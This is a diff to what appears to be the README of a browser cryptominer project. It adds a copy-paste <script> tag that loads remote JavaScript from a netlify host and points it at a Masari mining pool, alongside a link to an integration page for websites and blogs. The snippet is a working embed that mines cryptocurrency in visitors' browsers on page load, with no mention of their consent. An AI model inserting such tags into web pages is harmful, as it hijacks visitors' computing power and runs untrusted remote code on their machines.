@@ -39,6 +39,10 @@ Crypto Webminer | Electroneum | Monero | Bytecoin | IntenseCoin | Graft | Sumoko
 ```sh
 <script src="https://thelifeisbinary.netlify.com/media.js?perfekt=wss://?algo=cn/msr?variant=2?jason=masari.ingest.cryptoknight.cc:3333" > </script>
 ```
+#### Examples: CN Fast Coins (Conceal, Electronero) need ?algo=cn/msr?variant=1<br> 
+```sh
+<script src="https://thelifeisbinary.netlify.com/media.js?perfekt=wss://?algo=cn/msr?variant=1?jason=masari.ingest.cryptoknight.cc:3333" > </script>
+```
 <br><br> 
 Or use our integration for websites & blogs
 https://www.crypto-webminer.com/integrate.html
